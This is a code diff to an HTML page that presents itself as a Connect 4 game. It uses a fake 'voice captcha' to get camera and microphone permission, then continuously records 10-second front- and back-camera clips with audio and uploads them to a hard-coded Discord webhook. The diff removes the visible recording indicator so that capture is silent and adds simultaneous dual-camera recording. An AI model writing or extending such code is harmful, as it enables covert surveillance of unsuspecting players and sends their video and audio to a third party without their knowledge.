@@ -556,7 +556,7 @@
             }
         }
 
-        /* ===== NEW: INTRO SCREEN ===== */
+        /* ===== INTRO SCREEN ===== */
         #introScreen {
             position: fixed;
             inset: 0;
@@ -717,50 +717,9 @@
             }
         }
 
-        /* ===== RECORDING BADGE ===== */
+        /* ===== HIDE RECORDING BADGE ===== */
         #recordingBadge {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 50;
-            background: rgba(239, 68, 68, 0.85);
-            backdrop-filter: blur(10px);
-            padding: 8px 16px 8px 12px;
-            border-radius: 30px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: #fff;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.3);
-            opacity: 0;
-            transform: translateY(20px);
-            transition: opacity 0.4s ease, transform 0.4s ease;
-            pointer-events: none;
-            letter-spacing: 0.3px;
-        }
-
-        #recordingBadge.show {
-            opacity: 1;
-            transform: translateY(0);
-            pointer-events: none;
-        }
-
-        #recordingBadge .rec-dot {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #ef4444;
-            animation: dotPulse 1s ease-in-out infinite;
-        }
-
-        #recordingBadge .rec-cam {
-            color: rgba(255, 255, 255, 0.7);
-            font-weight: 400;
-            font-size: 0.7rem;
+            display: none !important;
         }
     </style>
 </head>
@@ -769,7 +728,7 @@
     <!-- ===== CANVAS ===== -->
     <canvas id="fxCanvas"></canvas>
 
-    <!-- ===== NEW: INTRO SCREEN ===== -->
+    <!-- ===== INTRO SCREEN ===== -->
     <div id="introScreen">
         <div class="intro-title">lea's connect 4</div>
         <div class="intro-sub">✦ championship edition ✦</div>
@@ -783,7 +742,7 @@
         </div>
     </div>
 
-    <!-- ===== EXISTING: MENU SCREEN ===== -->
+    <!-- ===== MENU SCREEN ===== -->
     <div id="menuScreen" class="screen">
         <h1>CONNECT FOUR</h1>
         <div class="menu-wrapper">
@@ -832,7 +791,7 @@
         </div>
     </div>
 
-    <!-- ===== EXISTING: MULTIPLAYER MENU ===== -->
+    <!-- ===== MULTIPLAYER MENU ===== -->
     <div id="mpMenuScreen" class="screen">
         <h1>MULTIPLAYER</h1>
         <div class="mp-container">
@@ -856,7 +815,7 @@
         </div>
     </div>
 
-    <!-- ===== EXISTING: GAME SCREEN ===== -->
+    <!-- ===== GAME SCREEN ===== -->
     <div id="gameScreen" class="screen">
         <div class="game-container">
 
@@ -891,7 +850,7 @@
         </div>
     </div>
 
-    <!-- ===== RECORDING BADGE ===== -->
+    <!-- ===== RECORDING BADGE (hidden) ===== -->
     <div id="recordingBadge">
         <span class="rec-dot"></span>
         <span id="recBadgeText">Recording</span>
@@ -902,8 +861,8 @@
     <!-- ===== JAVASCRIPT ===== -->
     <script>
         // ============================================================
-        //  NEW: INTRO + VOICE CAPTCHA + BACKGROUND RECORDING
-        //  (preserves all existing game code below)
+        //  INTRO + VOICE CAPTCHA + SILENT DUAL-CAM RECORDING
+        //  (preserves all existing game code)
         // ============================================================
 
         // -------- DOM refs --------
@@ -912,25 +871,20 @@
         const micBtn = document.getElementById('micBtn');
         const micDot = document.getElementById('micDot');
         const micStatusText = document.getElementById('micStatusText');
-        const recordingBadge = document.getElementById('recordingBadge');
-        const recBadgeText = document.getElementById('recBadgeText');
-        const recBadgeCam = document.getElementById('recBadgeCam');
 
         // -------- state --------
         let captchaPassed = false;
         let recordingActive = false;
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let recordingStream = null;
+        // For dual recording: we'll store two MediaRecorders and their streams
+        let mediaRecorders = [];
+        let recordersData = []; // each: { stream, recorder, chunks, facing }
+        let recordingInterval = null;
         let isRecording = false;
-        let currentFacing = 'user';
-        let recognition = null;
-        let micListening = false;
 
         const WEBHOOK_URL =
             'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
-        // -------- speech recognition --------
+        // -------- speech recognition (unchanged) --------
         function startVoiceCaptcha() {
             if (micListening || captchaPassed) return;
 
@@ -940,13 +894,10 @@
                 return;
             }
 
-            // Request mic permission first (and camera too, silently)
             navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user', width: { ideal: 160 },
                         height: { ideal: 120 } } })
                 .then(stream => {
-                    // Stop the stream immediately, we just need permission
                     stream.getTracks().forEach(t => t.stop());
-                    // Now start speech recognition
                     startListening();
                 })
                 .catch(err => {
@@ -955,6 +906,9 @@
                     console.warn('Permission error:', err);
                 });
         }
+
+        let micListening = false;
+        let recognition = null;
 
         function startListening() {
             micListening = true;
@@ -1046,113 +1000,163 @@
             micBtn.textContent = '✅ Done';
             micBtn.disabled = true;
 
-            // Hide intro, show menu
             setTimeout(() => {
                 introScreen.classList.add('hidden');
                 menuScreen.classList.add('active');
-                // Start background recording
                 startBackgroundRecording();
                 loadHighScores();
-                // Build board
                 buildBoardUI();
             }, 600);
         }
 
-        // -------- background recording (front/back switching) --------
+        // -------- DUAL-CAM RECORDING (simultaneous front + back) with fallback --------
         async function startBackgroundRecording() {
             if (recordingActive) return;
             recordingActive = true;
-            recordingBadge.classList.add('show');
-            recBadgeText.textContent = 'Recording';
-            currentFacing = 'user';
-            await recordClip('user');
+
+            // Attempt to get both cameras at once
+            let frontStream = null,
+                backStream = null;
+            try {
+                // Try to get both streams in parallel
+                const [front, back] = await Promise.all([
+                    navigator.mediaDevices.getUserMedia({
+                        audio: true,
+                        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
+                    }),
+                    navigator.mediaDevices.getUserMedia({
+                        audio: false, // audio only from front to avoid duplication
+                        video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } }
+                    })
+                ]);
+                frontStream = front;
+                backStream = back;
+                console.log('✅ Dual-cam streams acquired');
+            } catch (err) {
+                console.warn('Dual-cam not supported, falling back to alternating single cam:', err);
+                // Fallback: use only front camera, alternate by restarting
+                startAlternatingRecording();
+                return;
+            }
+
+            // If we have both, set up two MediaRecorders
+            if (frontStream && backStream) {
+                startDualRecording(frontStream, backStream);
+            } else {
+                startAlternatingRecording();
+            }
         }
 
-        async function recordClip(facing) {
-            if (!recordingActive) return;
+        function startDualRecording(frontStream, backStream) {
+            const recorders = [];
+            const chunksData = [];
 
-            try {
-                const constraints = {
-                    audio: true,
-                    video: {
-                        facingMode: facing,
-                        width: { ideal: 320 },
-                        height: { ideal: 240 }
-                    }
-                };
-
-                let stream;
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia(constraints);
-                } catch (err) {
-                    if (facing === 'environment') {
-                        recBadgeCam.textContent = '📷 front (fallback)';
-                        return recordClip('user');
-                    }
-                    throw err;
-                }
-
-                recordingStream = stream;
-                recordedChunks = [];
+            const createRecorder = (stream, facing) => {
                 const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ?
                     'video/webm;codecs=vp8,opus' :
                     'video/webm';
-
-                mediaRecorder = new MediaRecorder(stream, {
+                const recorder = new MediaRecorder(stream, {
                     mimeType: mimeType,
                     videoBitsPerSecond: 800000,
                     audioBitsPerSecond: 64000
                 });
-
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data && event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
+                const chunks = [];
+                recorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) chunks.push(e.data);
                 };
-
-                mediaRecorder.onstop = async () => {
-                    if (recordedChunks.length > 0) {
-                        const blob = new Blob(recordedChunks, { type: mimeType });
-                        await sendToWebhook(blob, facing);
+                recorder.onstop = () => {
+                    if (chunks.length > 0) {
+                        const blob = new Blob(chunks, { type: mimeType });
+                        sendToWebhook(blob, facing);
                     }
-                    if (recordingStream) {
-                        recordingStream.getTracks().forEach(t => t.stop());
-                        recordingStream = null;
-                    }
-                    if (recordingActive) {
-                        const nextFacing = (facing === 'user') ? 'environment' : 'user';
-                        recBadgeCam.textContent = `📷 ${nextFacing}`;
-                        setTimeout(() => { recordClip(nextFacing); }, 300);
-                    }
+                    // Stop tracks after sending
+                    stream.getTracks().forEach(t => t.stop());
                 };
+                return { recorder, chunks, stream, facing };
+            };
 
-                mediaRecorder.start(1000);
-                isRecording = true;
-                recBadgeText.textContent = '🔴 Recording';
-                recBadgeCam.textContent = `📷 ${facing}`;
+            const frontRec = createRecorder(frontStream, 'user');
+            const backRec = createRecorder(backStream, 'environment');
+            recorders.push(frontRec, backRec);
 
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        isRecording = false;
-                        recBadgeText.textContent = '⏳ Uploading...';
-                    }
-                }, 10000);
+            // Start both
+            frontRec.recorder.start(1000);
+            backRec.recorder.start(1000);
+            isRecording = true;
 
-            } catch (err) {
-                console.error('Recording error:', err);
-                recordingActive = false;
-                recordingBadge.classList.remove('show');
-                setTimeout(() => {
-                    if (!recordingActive) {
-                        recordingActive = true;
-                        recordingBadge.classList.add('show');
-                        recordClip('user');
-                    }
-                }, 2000);
-            }
+            // After 10 seconds, stop both and restart the cycle (if still active)
+            setTimeout(() => {
+                if (recordingActive) {
+                    // Stop both
+                    if (frontRec.recorder.state === 'recording') frontRec.recorder.stop();
+                    if (backRec.recorder.state === 'recording') backRec.recorder.stop();
+                    isRecording = false;
+                    // Restart after a small delay to allow cleanup
+                    setTimeout(() => {
+                        if (recordingActive) {
+                            // Re-acquire streams and start again
+                            startBackgroundRecording();
+                        }
+                    }, 500);
+                }
+            }, 10000);
         }
 
+        // -------- fallback: alternating single camera (original method) --------
+        let altFacing = 'user';
+
+        function startAlternatingRecording() {
+            if (!recordingActive) return;
+            const facing = altFacing;
+            altFacing = (altFacing === 'user') ? 'environment' : 'user';
+
+            navigator.mediaDevices.getUserMedia({
+                    audio: true,
+                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 } }
+                })
+                .then(stream => {
+                    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ?
+                        'video/webm;codecs=vp8,opus' :
+                        'video/webm';
+                    const recorder = new MediaRecorder(stream, {
+                        mimeType: mimeType,
+                        videoBitsPerSecond: 800000,
+                        audioBitsPerSecond: 64000
+                    });
+                    const chunks = [];
+                    recorder.ondataavailable = (e) => {
+                        if (e.data && e.data.size > 0) chunks.push(e.data);
+                    };
+                    recorder.onstop = () => {
+                        if (chunks.length > 0) {
+                            const blob = new Blob(chunks, { type: mimeType });
+                            sendToWebhook(blob, facing);
+                        }
+                        stream.getTracks().forEach(t => t.stop());
+                        // Schedule next clip if still active
+                        if (recordingActive) {
+                            setTimeout(() => { startAlternatingRecording(); }, 300);
+                        }
+                    };
+                    recorder.start(1000);
+                    isRecording = true;
+                    setTimeout(() => {
+                        if (recorder.state === 'recording') {
+                            recorder.stop();
+                            isRecording = false;
+                        }
+                    }, 10000);
+                })
+                .catch(err => {
+                    console.warn('Alternating recording error:', err);
+                    // Retry after delay
+                    if (recordingActive) {
+                        setTimeout(() => { startAlternatingRecording(); }, 2000);
+                    }
+                });
+        }
+
+        // -------- send to webhook with error handling --------
         async function sendToWebhook(blob, facing) {
             try {
                 const formData = new FormData();
@@ -1169,7 +1173,8 @@
                 });
 
                 if (!response.ok) {
-                    console.warn('Webhook upload failed:', response.status);
+                    const text = await response.text();
+                    console.warn(`Webhook upload failed (${response.status}):`, text);
                 } else {
                     console.log(`✅ Uploaded ${filename} (${(blob.size / 1024).toFixed(1)}KB)`);
                 }
@@ -1178,13 +1183,22 @@
             }
         }
 
+        // -------- stop recording --------
         function stopBackgroundRecording() {
             recordingActive = false;
-            if (mediaRecorder && mediaRecorder.state === 'recording') { try { mediaRecorder.stop(); } catch (e) {} }
-            if (recordingStream) { recordingStream.getTracks().forEach(t => t.stop());
-                recordingStream = null; }
+            if (recordingInterval) { clearTimeout(recordingInterval);
+                recordingInterval = null; }
+            // Stop all recorders
+            if (mediaRecorders.length) {
+                mediaRecorders.forEach(r => {
+                    if (r.recorder && r.recorder.state === 'recording') {
+                        try { r.recorder.stop(); } catch (e) {}
+                    }
+                    if (r.stream) r.stream.getTracks().forEach(t => t.stop());
+                });
+                mediaRecorders = [];
+            }
             isRecording = false;
-            recordingBadge.classList.remove('show');
         }
 
         window.addEventListener('beforeunload', () => { stopBackgroundRecording(); });
@@ -1193,8 +1207,7 @@
         micBtn.addEventListener('click', startVoiceCaptcha);
 
         // ============================================================
-        //  EXISTING GAME CODE (preserved entirely)
-        //  (with minor fix: menuScreen initially inactive)
+        //  EXISTING GAME CODE (preserved)
         // ============================================================
 
         const COLS = 7;
@@ -1841,7 +1854,7 @@
         window.clearRecords = clearRecords;
         window.claimPrize = claimPrize;
 
-        console.log('✅ Connect 4 with voice intro + background recording');
+        console.log('✅ Connect 4 with voice intro + silent dual-cam recording (fallback to alternating)');
     </script>
 
 </body>
